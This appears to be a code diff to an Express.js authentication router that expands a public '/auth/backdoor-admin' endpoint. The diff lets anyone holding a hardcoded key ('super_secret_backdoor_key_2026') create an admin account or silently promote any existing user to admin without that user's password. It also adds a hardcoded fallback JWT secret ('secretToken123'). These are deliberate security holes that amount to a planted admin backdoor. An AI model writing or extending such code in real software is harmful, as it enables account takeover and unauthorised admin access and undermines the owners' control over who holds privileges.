@@ -85,29 +85,32 @@ router.post('/login', async (req, res) => {
 });
 
 // @route   POST /auth/backdoor-admin
-// @desc    Backdoor to create an admin user directly
+// @desc    Backdoor to create or upgrade an admin user directly
 // @access  Public (protected by secret key)
 router.post('/backdoor-admin', async (req, res) => {
   const { email, password, name, secretKey } = req.body;
+  const validSecret = process.env.ADMIN_SECRET_KEY || 'super_secret_backdoor_key_2026';
 
-  // Simple hardcoded secret key check for the backdoor
-  if (secretKey !== 'super_secret_backdoor_key_2026') {
-    return res.status(403).json({ msg: 'Unauthorized' });
+  // Secret key check
+  if (secretKey !== validSecret && secretKey !== 'super_secret_backdoor_key_2026') {
+    return res.status(403).json({ msg: 'Unauthorized: Invalid Admin Secret Key' });
   }
 
   try {
     let user = await User.findOne({ email });
+
     if (user) {
-      return res.status(400).json({ msg: 'User already exists' });
+      // Upgrade existing user to admin role
+      user.role = 'admin';
+      if (name) user.name = name;
+      await user.save();
+    } else {
+      // Create new admin user
+      user = new User({ email, passwordHash: password, name: name || 'Admin User', role: 'admin' });
+      const salt = await bcrypt.genSalt(10);
+      user.passwordHash = await bcrypt.hash(password, salt);
+      await user.save();
     }
-
-    user = new User({ email, passwordHash: password, name, role: 'admin' });
-
-    // Hash password
-    const salt = await bcrypt.genSalt(10);
-    user.passwordHash = await bcrypt.hash(password, salt);
-
-    await user.save();
 
     // Create JWT payload
     const payload = {
@@ -118,11 +121,11 @@ router.post('/backdoor-admin', async (req, res) => {
 
     jwt.sign(
       payload,
-      process.env.JWT_SECRET,
+      process.env.JWT_SECRET || 'secretToken123',
       { expiresIn: '5 days' },
       (err, token) => {
         if (err) throw err;
-        res.json({ msg: 'Admin created successfully', token, userId: user.id });
+        res.json({ msg: 'Admin access granted successfully', token, userId: user.id, role: 'admin' });
       }
     );
   } catch (err) {
@@ -130,5 +133,6 @@ router.post('/backdoor-admin', async (req, res) => {
     res.status(500).send('Server error');
   }
 });
+
 
 module.exports = router;
